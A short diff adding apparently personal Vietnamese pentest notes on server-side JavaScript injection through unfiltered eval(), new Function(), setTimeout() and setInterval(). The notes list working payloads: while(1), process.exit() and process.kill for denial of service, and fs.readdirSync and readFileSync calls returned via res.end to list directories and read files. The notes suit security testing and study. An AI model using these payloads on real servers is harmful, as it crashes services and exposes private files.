@@ -1,0 +1,13 @@
+Ứng dụng web sử dụng hàm eval(), setTimeout(),setInterval() không được lọc đúng cách dễ bị tấn công
+
+eval("code")
+new Function("code")
+setTimeout("code", timeout)
+setInterval("code", interval)
+
+Dos:
+Gửi lệnh while(1)/process.exit()/process.kill(process.pid)  đến hàm eval
+File System Access:
+res.end(require('fs').readdirSync('.').toString())
+res.end(require('fs').readdirSync('..').toString()) 
+view: content -> res.end(require('fs').readFileSync(filename))
